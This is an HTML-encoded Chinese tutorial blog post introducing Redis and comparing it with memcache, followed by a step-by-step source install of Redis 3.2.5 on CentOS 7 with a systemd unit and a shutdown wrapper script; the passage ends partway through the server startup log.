    <content type="html"><![CDATA[<h1 id="Redis&#x6982;&#x8FF0;"><a href="#Redis&#x6982;&#x8FF0;" class="headerlink" title="Redis&#x6982;&#x8FF0;"></a>Redis&#x6982;&#x8FF0;</h1><h2 id="&#x4EC0;&#x4E48;&#x662F;Redis"><a href="#&#x4EC0;&#x4E48;&#x662F;Redis" class="headerlink" title="&#x4EC0;&#x4E48;&#x662F;Redis"></a>&#x4EC0;&#x4E48;&#x662F;Redis</h2><p>Redis&#x7684;&#x51FA;&#x73B0;&#x65F6;&#x95F4;&#x5E76;&#x4E0D;&#x957F;&#xFF0C;&#x662F;NoSQL&#x7684;&#x4E00;&#x79CD;&#xFF0C;&#x57FA;&#x4E8E;&#x952E;-&#x503C;&#x578B;&#x7684;&#x5B58;&#x50A8;&#xFF0C;&#x4E0E;memcache&#x7C7B;&#x4F3C;&#xFF0C;&#x4F46;&#x662F;memcache&#x4E2D;&#x53EA;&#x662F;&#x5185;&#x5B58;&#x7684;&#x7F13;&#x5B58;&#xFF0C;&#x800C;Redis&#x4E0D;&#x4EC5;&#x662F;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x7F13;&#x5B58;&#xFF0C;&#x8FD8;&#x63D0;&#x4F9B;&#x6301;&#x4E45;&#x5B58;&#x50A8;&#xFF0C;&#x5728;2009&#x5E74;&#x7B2C;&#x4E00;&#x6B21;&#x53D1;&#x5E03;Redis&#x3002;</p><p>Redis&#x5168;&#x79F0;&#xFF08;Remote Dictionary Server&#xFF09;&#x8FDC;&#x7A0B;&#x5B57;&#x5178;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x800C;&#x8FD9;&#x4E2A;&#x5B57;&#x5178;&#x670D;&#x52A1;&#x5668;&#x4ECE;&#x672C;&#x8D28;&#x4E0A;&#x6765;&#x8BB2;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x63D0;&#x4F9B;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x7684;&#x8FDC;&#x7A0B;&#x5B58;&#x50A8;&#x529F;&#x80FD;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x4E3A;Redis&#x662F;&#x4E00;&#x4E2A;&#x9AD8;&#x7EA7;&#x7684;K-V&#x5B58;&#x50A8;&#xFF0C;&#x548C;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x5B58;&#x50A8;&#xFF0C;&#x56E0;&#x4E3A;Redis&#x9664;&#x4E86;&#x80FD;&#x591F;&#x5B58;&#x50A8;K-V&#x8FD9;&#x79CD;&#x7B80;&#x5355;&#x7684;&#x6570;&#x636E;&#x4E4B;&#x5916;&#xFF0C;&#x8FD8;&#x80FD;&#x591F;&#x5B58;&#x50A8;&#x5217;&#x8868;&#x3001;&#x5B57;&#x5178;&#x3001;hash&#x8868;&#x7B49;&#x5BF9;&#x5E94;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x3002;</p><p>&#x5728;&#x6027;&#x80FD;&#x4E0A;Redis&#x4E0D;&#x6BD4;memcache&#x5DEE;&#xFF0C;&#x56E0;&#x4E3A;redis&#x6574;&#x4E2A;&#x8FD0;&#x884C;&#x901A;&#x901A;&#x90FD;&#x662F;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x5B83;&#x7684;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x96C6;&#x90FD;&#x662F;&#x4FDD;&#x5B58;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#xFF0C;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4F1A;&#x5468;&#x671F;&#x6027;&#x7684;&#x5199;&#x5165;&#x5230;&#x78C1;&#x76D8;&#x4E0A;&#xFF0C;&#x4EE5;&#x5B9E;&#x73B0;&#x6570;&#x636E;&#x7684;&#x6301;&#x4E45;&#x529F;&#x80FD;&#xFF0C;&#x800C;&#x8FD9;&#x79CD;&#x5199;&#x78C1;&#x76D8;&#x5E76;&#x4E0D;&#x662F;&#x7528;&#x4E8E;&#x8BBF;&#x95EE;&#xFF0C;&#x800C;&#x4EC5;&#x662F;&#x5197;&#x4F59;&#x529F;&#x80FD;&#xFF0C;&#x6240;&#x4EE5;redis&#x6240;&#x6709;&#x529F;&#x80FD;&#x90FD;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x5B8C;&#x6210;&#xFF0C;&#x56E0;&#x4E3A;&#x6B64;&#x6027;&#x80FD;&#x4E5F;&#x662F;&#x53EF;&#x60F3;&#x800C;&#x77E5;&#x3002;</p><p>redis&#x4E0E;mamcache&#x4E0D;&#x540C;&#x4E4B;&#x5904;&#x5728;&#x4E8E;redis&#x6709;&#x4E00;&#x4E2A;&#x5468;&#x671F;&#x6027;&#x7684;&#x5C06;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x5230;&#x78C1;&#x76D8;&#x4E0A;&#x7684;&#x673A;&#x5236;&#xFF0C;&#x800C;&#x4E14;&#x4E0D;&#x53EA;&#x4E00;&#x79CD;&#xFF0C;&#x6709;&#x4E24;&#x79CD;&#x673A;&#x5236;&#xFF0C;&#x8FD9;&#x4E5F;&#x662F;redis&#x6301;&#x4E45;&#x5316;&#x7684;&#x4E00;&#x79CD;&#x5B9E;&#x73B0;&#xFF0C;<strong>&#x53E6;&#x5916;&#x4E0E;memcache&#x6709;&#x6240;&#x533A;&#x522B;&#x7684;&#x662F;&#xFF0C;redis&#x662F;&#x5355;&#x7EBF;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x6765;&#x54CD;&#x5E94;&#x6240;&#x6709;&#x7684;&#x8BF7;&#x6C42;</strong><br>redis&#x652F;&#x6301;&#x4E3B;&#x4ECE;&#x6A21;&#x5F0F;&#xFF0C;&#x4F46;&#x662F;redis&#x7684;&#x4E3B;&#x4ECE;&#x6A21;&#x5F0F;&#x9ED8;&#x8BA4;&#x5C31;&#x6709;&#x4E00;&#x4E2A;sentinel&#x5DE5;&#x5177;&#xFF0C;&#x4ECE;&#x800C;&#x5B9E;&#x73B0;&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;redis&#x80FD;&#x591F;&#x501F;&#x52A9;&#x4E8E;sentinel&#x5DE5;&#x5177;&#x6765;&#x76D1;&#x63A7;&#x4E3B;&#x4ECE;&#x8282;&#x70B9;&#xFF0C;&#x5F53;&#x4E3B;&#x8282;&#x70B9;&#x53D1;&#x751F;&#x6545;&#x969C;&#x65F6;&#xFF0C;&#x4F1A;&#x81EA;&#x5DF1;&#x63D0;&#x5347;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x4ECE;&#x8282;&#x70B9;&#x6210;&#x4E3A;&#x65B0;&#x7684;&#x4E3B;&#x8282;&#x70B9;</p><p>&#x5728;redis 3.0&#x7248;&#x672C;&#x53D1;&#x5E03;&#xFF0C;&#x5F00;&#x59CB;&#x652F;&#x6301;redis&#x96C6;&#x7FA4;&#xFF0C;&#x4ECE;&#x800C;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x53EF;&#x4EE5;&#x5C06;&#x7528;&#x6237;&#x7684;&#x8BF7;&#x6C42;&#x5206;&#x6563;&#x81F3;&#x591A;&#x4E2A;&#x4E0D;&#x540C;&#x8282;&#x70B9;</p><h2 id="Redis&#x6240;&#x652F;&#x6301;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;"><a href="#Redis&#x6240;&#x652F;&#x6301;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;" class="headerlink" title="Redis&#x6240;&#x652F;&#x6301;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;"></a>Redis&#x6240;&#x652F;&#x6301;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;</h2><p>&#x652F;&#x6301;&#x5B58;&#x50A8;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x6709;&#x3001;String&#xFF08;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5305;&#x542B;&#x6574;&#x6570;&#xFF09;, List&#xFF08;&#x5217;&#x8868;&#xFF09;, Hash&#xFF08;&#x5173;&#x8054;&#x6570;&#x7EC4;&#xFF09;, Sets&#xFF08;&#x96C6;&#x5408;&#xFF09;, Sorted Sets&#xFF08;&#x6709;&#x5E8F;&#x96C6;&#x5408;&#xFF09;, Bitmaps&#xFF08;&#x4F4D;&#x56FE;&#xFF09;, HyperLoglog </p><h2 id="Redis&#x6027;&#x80FD;&#x8BC4;&#x4F30;"><a href="#Redis&#x6027;&#x80FD;&#x8BC4;&#x4F30;" class="headerlink" title="Redis&#x6027;&#x80FD;&#x8BC4;&#x4F30;"></a>Redis&#x6027;&#x80FD;&#x8BC4;&#x4F30;</h2><p>1&#x3001;100&#x4E07;&#x8F83;&#x5C0F;&#x7684;&#x952E;&#x5B58;&#x50A8;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5927;&#x6982;&#x6D88;&#x8017;100M&#x5185;&#x5B58;</p><p>2&#x3001;&#x7531;&#x4E8E;redis&#x662F;&#x5355;&#x7EBF;&#x7A0B;&#xFF0C;&#x5982;&#x679C;&#x670D;&#x52A1;&#x5668;&#x4E3B;&#x673A;&#x4E0A;&#x6709;&#x591A;&#x4E2A;CPU&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x80FD;&#x591F;&#x4F7F;&#x7528;&#xFF0C;&#x4F46;&#x5E76;&#x4E0D;&#x610F;&#x5473;&#x7740;CPU&#x4F1A;&#x6210;&#x4E3A;&#x74F6;&#x9888;&#xFF0C;&#x56E0;&#x4E3A;redis&#x662F;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x7684;K-V&#x6570;&#x636E;&#x5B58;&#x50A8;&#xFF0C;CPU&#x901A;&#x5E38;&#x4E0D;&#x4F1A;&#x6210;&#x4E3A;&#x74F6;&#x9888;&#x7684;</p><p>3&#x3001;&#x5728;&#x5E38;&#x89C1;&#x7684;linux&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;500K&#xFF08;50&#x4E07;&#xFF09;&#x7684;&#x5E76;&#x53D1;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x4E00;&#x79D2;&#x949F;&#x5904;&#x7406;&#xFF0C;&#x5982;&#x679C;&#x4E3B;&#x673A;&#x786C;&#x4EF6;&#x8F83;&#x597D;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6BCF;&#x79D2;&#x949F;&#x53EF;&#x4EE5;&#x8FBE;&#x5230;&#x4E0A;&#x767E;&#x4E07;&#x7684;&#x5E76;&#x53D1;</p><h2 id="Redis&#x4E0E;memcache&#x5BF9;&#x6BD4;&#xFF1A;"><a href="#Redis&#x4E0E;memcache&#x5BF9;&#x6BD4;&#xFF1A;" class="headerlink" title="Redis&#x4E0E;memcache&#x5BF9;&#x6BD4;&#xFF1A;"></a>Redis&#x4E0E;memcache&#x5BF9;&#x6BD4;&#xFF1A;</h2><ul><li>Memcache&#x662F;&#x4E00;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x7684;&#x5185;&#x5B58;&#x5BF9;&#x8C61;&#x7F13;&#x5B58;&#x7CFB;&#x7EDF;</li><li>&#x800C;redis&#x662F;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x6301;&#x4E45;&#x5B58;&#x50A8;</li><li>Memcache&#x662F;&#x4E00;&#x4E2A;LRU&#x7684;&#x7F13;&#x5B58;</li><li>redis&#x652F;&#x6301;&#x66F4;&#x591A;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;</li><li>Memcache&#x662F;&#x591A;&#x7EBF;&#x7A0B;&#x7684;</li><li>redis&#x662F;&#x5355;&#x7EBF;&#x7A0B;&#x7684;</li><li>&#x4E8C;&#x8005;&#x6027;&#x80FD;&#x51E0;&#x4E4E;&#x4E0D;&#x76F8;&#x4E0A;&#x4E0B;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;redis&#x4F1A;&#x53D7;&#x5230;&#x786C;&#x76D8;&#x6301;&#x4E45;&#x5316;&#x7684;&#x5F71;&#x54CD;&#xFF0C;&#x4F46;&#x662F;&#x6027;&#x80FD;&#x4ECD;&#x7136;&#x4FDD;&#x6301;&#x5728;&#x4E0E;Memcache&#x4E0D;&#x76F8;&#x4E0A;&#x4E0B;&#xFF0C;&#x662F;&#x975E;&#x5E38;&#x4E86;&#x4E0D;&#x8D77;&#x7684;</li></ul><h2 id="Redis&#x7684;&#x4F18;&#x52BF;"><a href="#Redis&#x7684;&#x4F18;&#x52BF;" class="headerlink" title="Redis&#x7684;&#x4F18;&#x52BF;"></a>Redis&#x7684;&#x4F18;&#x52BF;</h2><ul><li><p>&#x4E30;&#x5BCC;&#x7684;&#xFF08;&#x8D44;&#x6599;&#x5F62;&#x6001;&#xFF09;&#x64CD;&#x4F5C;<br>string&#xFF08;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5305;&#x542B;&#x6574;&#x6570;&#xFF09;, List&#xFF08;&#x5217;&#x8868;&#xFF09;, Hash&#xFF08;&#x5173;&#x8054;&#x6570;&#x7EC4;&#xFF09;, Sets&#xFF08;&#x96C6;&#x5408;&#xFF09;, Sorted Sets&#xFF08;&#x6709;&#x5E8F;&#x96C6;&#x5408;&#xFF09;, Bitmaps&#xFF08;&#x4F4D;&#x56FE;&#xFF09;, HyperLoglog</p></li><li><p>&#x5185;&#x5EFA;Replication&#x548C;culster&#xFF08;&#x81EA;&#x8EAB;&#x652F;&#x6301;&#x590D;&#x5236;&#x53CA;&#x96C6;&#x7FA4;&#x529F;&#x80FD;&#xFF09;  </p></li><li>&#x652F;&#x6301;&#x5C31;&#x5730;&#x66F4;&#x65B0;&#xFF08;in-place update&#xFF09;&#x64CD;&#x4F5C;&#xFF0C;&#x76F4;&#x63A5;&#x53EF;&#x4EE5;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x5B8C;&#x6210;&#x66F4;&#x65B0;&#x64CD;&#x4F5C;  </li><li>&#x652F;&#x6301;&#x6301;&#x4E45;&#x5316;&#xFF08;&#x78C1;&#x76D8;&#xFF09;<br>&#x907F;&#x514D;&#x96EA;&#x5D29;&#x6548;&#x5E94;&#xFF0C;&#x4E07;&#x4E00;&#x51FA;&#x73B0;&#x96EA;&#x5D29;&#x6548;&#x5E94;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x90FD;&#x65E0;&#x6CD5;&#x6062;&#x590D;&#xFF0C;&#x4F46;redis&#x7531;&#x4E8E;&#x6709;&#x6301;&#x4E45;&#x6027;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x6062;&#x590D;</li></ul><h2 id="Memcached&#x7684;&#x4F18;&#x52BF;"><a href="#Memcached&#x7684;&#x4F18;&#x52BF;" class="headerlink" title="Memcached&#x7684;&#x4F18;&#x52BF;"></a>Memcached&#x7684;&#x4F18;&#x52BF;</h2><ul><li>&#x591A;&#x7EBF;&#x7A0B;</li><li>&#x5584;&#x7528;&#x591A;&#x6838;CPU</li><li>&#x66F4;&#x5C11;&#x7684;&#x963B;&#x585E;&#x64CD;&#x4F5C;</li><li>&#x66F4;&#x5C11;&#x7684;&#x5185;&#x5B58;&#x5F00;&#x9500;</li><li>&#x66F4;&#x5C11;&#x7684;&#x5185;&#x5B58;&#x5206;&#x914D;&#x538B;&#x529B;</li><li>&#x53EF;&#x80FD;&#x6709;&#x66F4;&#x5C11;&#x7684;&#x5185;&#x5B58;&#x788E;&#x7247;</li></ul><h1 id="&#x5B89;&#x88C5;Redis"><a href="#&#x5B89;&#x88C5;Redis" class="headerlink" title="&#x5B89;&#x88C5;Redis"></a>&#x5B89;&#x88C5;Redis</h1><p><a href="https://redis.io" target="_blank" rel="noopener">https://redis.io</a>  &#x5B98;&#x7F51;<br><a href="https://download.redis.io/releases/" target="_blank" rel="noopener">https://download.redis.io/releases/</a>  &#x4E0B;&#x8F7D;&#x5730;&#x5740;</p><h2 id="&#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;"><a href="#&#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;" class="headerlink" title="&#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;"></a>&#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;</h2><p><strong>&#x83B7;&#x53D6;&#x6E90;&#x7801;&#x5305;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; wget https://download.redis.io/releases/redis-3.2.5.tar.gz</span><br><span class="line">--2022-05-09 04:27:32--  https://download.redis.io/releases/redis-3.2.5.tar.gz</span><br><span class="line">Connecting to 192.168.73.1:7890... connected.</span><br><span class="line">Proxy request sent, awaiting response... 200 OK</span><br><span class="line">Length: 1544040 (1.5M) [application/octet-stream]</span><br><span class="line">Saving to: &#x2018;redis-3.2.5.tar.gz&#x2019;</span><br><span class="line"></span><br><span class="line"><span class="meta">100%</span><span class="bash">[==================================================================================================================&gt;] 1,544,040   1.10MB/s   <span class="keyword">in</span> 1.3s</span></span><br><span class="line"></span><br><span class="line">2022-05-09 04:27:35 (1.10 MB/s) - &#x2018;redis-3.2.5.tar.gz&#x2019; saved [1544040/1544040]</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x89E3;&#x538B;&#x6587;&#x4EF6;&#x5230;<code>/usr/local/</code></strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; tar zxvf redis-3.2.5.tar.gz -C /usr/local/</span><br><span class="line">redis-3.2.5/</span><br><span class="line">redis-3.2.5/.gitignore</span><br><span class="line">redis-3.2.5/00-RELEASENOTES</span><br><span class="line">redis-3.2.5/BUGS</span><br><span class="line">redis-3.2.5/CONTRIBUTING</span><br><span class="line">redis-3.2.5/COPYING</span><br><span class="line">redis-3.2.5/INSTALL</span><br><span class="line">redis-3.2.5/MANIFESTO</span><br><span class="line">redis-3.2.5/Makefile</span><br><span class="line">redis-3.2.5/README.md</span><br><span class="line">redis-3.2.5/deps/</span><br><span class="line">redis-3.2.5/deps/Makefile</span><br><span class="line">redis-3.2.5/deps/README.md</span><br><span class="line">redis-3.2.5/deps/geohash-int/</span><br><span class="line">redis-3.2.5/deps/geohash-int/Makefile</span><br><span class="line">redis-3.2.5/deps/geohash-int/geohash.c</span><br><span class="line">redis-3.2.5/deps/geohash-int/geohash.h</span><br><span class="line">redis-3.2.5/deps/geohash-int/geohash_helper.c</span><br><span class="line">..................&#x7701;&#x7565;..........................</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x5B89;&#x88C5;&#x7F16;&#x8BD1;&#x73AF;&#x5883;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini redis-3.2.5]&amp; yum install -y gcc gcc-c++ kernel-devel</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x7F16;&#x8BD1;Redis</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini src]&amp; make &amp;&amp; make install</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x521B;&#x5EFA;redis.service&#x542F;&#x52A8;&#x6587;&#x4EF6;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; vim /usr/lib/systemd/system/redis.service</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=Redis persistent key-value database</span><br><span class="line"><span class="attr">After</span>=network.target</span><br><span class="line"> </span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">ExecStart</span>=/usr/local/redis-<span class="number">3.2</span>.<span class="number">5</span>/src/redis-server /usr/local/redis-<span class="number">3.2</span>.<span class="number">5</span>/redis.conf --supervised systemd</span><br><span class="line"><span class="attr">ExecStop</span>=/usr/libexec/redis-shutdown</span><br><span class="line"><span class="attr">Type</span>=notify</span><br><span class="line"><span class="attr">User</span>=redis</span><br><span class="line"><span class="attr">Group</span>=redis</span><br><span class="line"><span class="attr">RuntimeDirectory</span>=redis</span><br><span class="line"><span class="attr">RuntimeDirectoryMode</span>=<span class="number">0755</span></span><br><span class="line"> </span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target</span><br></pre></td></tr></tbody></table></figure><p>&#x521B;&#x5EFA;redis-shutdown&#x6587;&#x4EF6;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini src]&amp; vim /usr/libexec/redis-shutdown</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#=========================================================##</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Wrapper to close properly redis and sentinel</span></span><br><span class="line">test x&quot;$REDIS_DEBUG&quot; != x &amp;&amp; set -x</span><br><span class="line"></span><br><span class="line">REDIS_CLI=/usr/local/redis-3.2.5/src/redis-cli</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Retrieve service name</span></span><br><span class="line">SERVICE_NAME=&quot;$1&quot;</span><br><span class="line">if [ -z &quot;$SERVICE_NAME&quot; ]; then</span><br><span class="line">   SERVICE_NAME=redis</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Get the proper config file based on service name</span></span><br><span class="line">CONFIG_FILE=&quot;/etc/$SERVICE_NAME.conf&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Use awk to retrieve host, port from config file</span></span><br><span class="line">HOST=`awk &apos;/^[[:blank:]]*bind/ { print $2 }&apos; $CONFIG_FILE | tail -n1`</span><br><span class="line">PORT=`awk &apos;/^[[:blank:]]*port/ { print $2 }&apos; $CONFIG_FILE | tail -n1`</span><br><span class="line">PASS=`awk &apos;/^[[:blank:]]*requirepass/ { print $2 }&apos; $CONFIG_FILE | tail -n1`</span><br><span class="line">SOCK=`awk &apos;/^[[:blank:]]*unixsocket\s/ { print $2 }&apos; $CONFIG_FILE | tail -n1`</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Just <span class="keyword">in</span> <span class="keyword">case</span>, use default host, port</span></span><br><span class="line">HOST=${HOST:-127.0.0.1}</span><br><span class="line">if [ &quot;$SERVICE_NAME&quot; = redis ]; then</span><br><span class="line">    PORT=${PORT:-6379}</span><br><span class="line">else</span><br><span class="line">    PORT=${PORT:-26739}</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Setup additional parameters</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> e.g password-protected redis instances</span></span><br><span class="line">[ -z &quot;$PASS&quot;  ] || ADDITIONAL_PARAMS=&quot;-a $PASS&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> shutdown the service properly</span></span><br><span class="line">if [ -e &quot;$SOCK&quot; ] ; then</span><br><span class="line">    $REDIS_CLI -s $SOCK $ADDITIONAL_PARAMS shutdown</span><br><span class="line">else</span><br><span class="line">    $REDIS_CLI -h $HOST -p $PORT $ADDITIONAL_PARAMS shutdown</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#=========================================================##</span></span></span><br><span class="line"></span><br><span class="line">[root@ctos7mini src]&amp; chmod 755 /usr/libexec/redis-shutdown</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; useradd redis -s /sbin/nologin</span><br><span class="line">[root@ctos7mini ~]&amp; systemctl daemon-reload</span><br><span class="line">[root@ctos7mini ~]&amp; systemctl start redis</span><br><span class="line">[root@ctos7mini ~]&amp; netstat -pantul | grep 6379</span><br><span class="line">tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      1282/redis-server *</span><br><span class="line">tcp6       0      0 :::6379                 :::*                    LISTEN      1282/redis-server *</span><br><span class="line">[root@ctos7mini ~]&amp;</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; redis-server &amp;</span><br><span class="line">[1] 1282</span><br><span class="line">[root@ctos7mini ~]&amp; 1282:C 09 May 04:53:34.532 # Warning: no config file specified, using the default config. In order to specify a config file use redis-server /path/to/redis.conf</span><br><span class="line">1282:M 09 May 04:53:34.533 * Increased maximum number of open files to 10032 (it was originally set to 1024).</span><br><span class="line">                _._</span><br><span class="line">           _.-``__ &apos;&apos;-._</span><br><span class="line">      _.-``    `.  `_.  &apos;&apos;-._           Redis 3.2.5 (00000000/0) 64 bit</span><br><span class="line">  .-`` .-```.  ```\/    _.,_ &apos;&apos;-._</span><br><span class="line"> (    &apos;      ,       .-`  | `,    )     Running in standalone mode</span><br><span class="line"> |`-._`-...-` __...-.``-._|&apos;` _.-&apos;|     Port: 6379</span><br><span class="line"> |    `-._   `._    /     _.-&apos;    |     PID: 1282</span><br><span class="line">  `-._    `-._  `-./  _.-&apos;    _.-&apos;</span><br><span class="line"> |`-._`-._    `-.__.-&apos;    _.-&apos;_.-&apos;|</span><br><span class="line"> |    `-._`-._        _.-&apos;_.-&apos;    |           http://redis.io</span><br><span class="line">  `-._    `-._`-.__.-&apos;_.-&apos;    _.-&apos;</span><br><span class="line"> |`-._`-._    `-.__.-&apos;    _.-&apos;_.-&apos;|</span><br><span class="line"> |    `-._`-._        _.-&apos;_.-&apos;    |</span><br><span class="line">  `-._    `-._`-.__.-&apos;_.-&apos;    _.-&apos;</span><br><span class="line">      `-._    `-.__.-&apos;    _.-&apos;</span><br><span class="line">          `-._        _.-&apos;</span><br><span class="line">              `-.__.-&apos;</span><br><span class="line"></span><br><span 